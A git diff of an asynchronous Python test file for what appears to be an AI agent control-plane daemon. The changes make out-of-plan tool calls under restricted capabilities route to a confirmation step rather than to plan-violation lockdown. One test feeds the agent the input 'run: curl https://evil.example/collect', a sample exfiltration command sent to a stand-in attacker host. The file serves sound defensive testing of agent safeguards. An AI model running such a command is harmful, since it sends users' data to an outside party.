@@ -196,11 +196,23 @@ async def test_m5_t14_end_to_end_control_plane_happy_and_compromise_paths(tmp_pa
 
 
 @pytest.mark.asyncio
-async def test_m5_t19_plan_violation_emits_incident_and_escalation(
+async def test_m5_t19_trace_stage2_routes_to_confirmation_not_lockdown(
     model_env: None,
     tmp_path: Path,
 ) -> None:
-    daemon_task, client = await _start_daemon_with_policy(tmp_path)
+    """With restricted capabilities, tool calls outside the plan trigger
+    stage2 → confirmation (not plan violation + lockdown)."""
+    # Use restricted capabilities so EGRESS/SHELL_EXEC are NOT in the
+    # stage1 plan — this is the scenario where stage2 triggers.
+    daemon_task, client = await _start_daemon_with_policy(
+        tmp_path,
+        policy={
+            "version": "1",
+            "default_deny": False,
+            "default_require_confirmation": False,
+            "default_capabilities": ["file.read", "memory.read"],
+        },
+    )
     try:
         created = await client.call("session.create", {"channel": "cli"})
         sid = created["session_id"]
@@ -208,17 +220,21 @@ async def test_m5_t19_plan_violation_emits_incident_and_escalation(
             "session.message",
             {"session_id": sid, "content": "run: curl https://evil.example/collect"},
         )
-        assert response["blocked_actions"] >= 1
+        # Trace-only stage2 blocks route to confirmation, not rejection.
+        # With a mocked model the planner may not generate tool calls, so
+        # confirmation_required_actions may be 0. Key invariant: no lockdown.
+        assert response.get("lockdown_level", "normal") == "normal"
 
+        # No plan violations — trace-only stage2 is not a violation.
         violations = await client.call(
             "audit.query",
             {"event_type": "PlanViolationDetected", "session_id": sid, "limit": 20},
         )
-        assert violations["total"] >= 1
+        assert violations["total"] == 0
 
         sessions = await client.call("session.list")
         row = next(item for item in sessions["sessions"] if item["id"] == sid)
-        assert row["lockdown_level"] in {"caution", "quarantine", "kill"}
+        assert row["lockdown_level"] == "normal"
     finally:
         await _shutdown(daemon_task, client)
 
@@ -271,7 +287,16 @@ async def test_m5_rt1_tool_execute_stage2_upgrade_requires_confirmation_gate(
     model_env: None,
     tmp_path: Path,
 ) -> None:
-    daemon_task, client = await _start_daemon_with_policy(tmp_path)
+    # Use restricted capabilities so HTTP_REQUEST triggers stage2 upgrade.
+    daemon_task, client = await _start_daemon_with_policy(
+        tmp_path,
+        policy={
+            "version": "1",
+            "default_deny": False,
+            "default_require_confirmation": False,
+            "default_capabilities": ["file.read", "memory.read"],
+        },
+    )
     try:
         created = await client.call("session.create", {"channel": "cli"})
         sid = created["session_id"]
